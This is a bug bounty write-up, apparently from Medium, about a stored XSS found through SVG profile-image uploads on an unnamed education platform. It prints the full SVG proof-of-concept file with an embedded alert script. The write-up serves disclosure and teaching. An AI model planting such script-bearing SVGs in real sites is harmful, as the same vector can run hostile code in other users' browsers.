Hello guys, hope you all are doing well, This is my first writeup on medium.

I’m Ahmed Kamal a Security Researcher and bug bounty hunter from Egypt, 
In this Writeup I’ll tell you about my latest findings on VDP which was Stored Xss, 
but Due to the company’s policy I can’t reveal the name of the program lets say target.com.

The target was Education platform which has many functionalities but here I’ll talk about profile image uplaod in profile setting page.
I started to upload jpg, png, jpeg all was normal, but when i tried to upload svg file i was surprised that it was accepted which is not common.

Before we go to exploitation let’s give a brief explaination about SVG,
Scalable Vector Graphics (SVG) is a web-friendly vector file format.The SVG file format is a popular tool for displaying two-dimensional graphics, 
charts, and illustrations on websites.

I had Read some exploitation technique to this scenario on hacktricks,

https://book.hacktricks.xyz/pentesting-web/file-upload

one of them was stored XSS, then I made a file with .svg extension with the following payload:
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert("XSS by Ahmed Kamal");
  </script>
</svg>

After uploading the file in the profile photo section, I opened the image in new tab and BOOM!!! that alert box.

After that i tried the same Scenario on another subdomain of the target and i was SHOCKED!!! i found the same vulnerability.
That’s all have a nice day.
